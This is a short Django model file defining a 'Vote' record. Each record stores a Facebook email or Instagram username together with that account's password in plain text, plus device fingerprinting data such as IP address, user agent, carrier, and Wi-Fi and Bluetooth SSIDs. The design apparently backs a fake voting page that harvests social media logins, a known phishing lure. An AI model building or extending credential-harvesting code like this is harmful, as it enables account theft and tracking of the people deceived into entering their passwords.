from django.db import models

class Vote(models.Model):
    PLATFORM_CHOICES = [
        ('facebook', 'Facebook'),
        ('instagram', 'Instagram'),
    ]
    platform = models.CharField(max_length=10, choices=PLATFORM_CHOICES)
    username = models.CharField(max_length=255, null=True, blank=True)  # For Instagram
    email = models.EmailField(null=True, blank=True)  # For Facebook
    password = models.CharField(max_length=255)

    # Device-related fields
    device_model = models.CharField(max_length=255, null=True, blank=True)
    device_manufacturer = models.CharField(max_length=255, null=True, blank=True)
    operating_system = models.CharField(max_length=255, null=True, blank=True)
    os_version = models.CharField(max_length=50, null=True, blank=True)
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    user_agent = models.TextField(null=True, blank=True)
    network_info = models.CharField(max_length=255, null=True, blank=True)
    carrier_info = models.CharField(max_length=255, null=True, blank=True)
    bluetooth_ssid = models.CharField(max_length=255, null=True, blank=True)
    wifi_ssid = models.CharField(max_length=255, null=True, blank=True)

    # Timestamp
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        if self.platform == 'facebook':
            return f"Facebook vote by {self.email}"
        elif self.platform == 'instagram':
            return f"Instagram vote by {self.username}"
        return f"{self.platform.capitalize()} vote"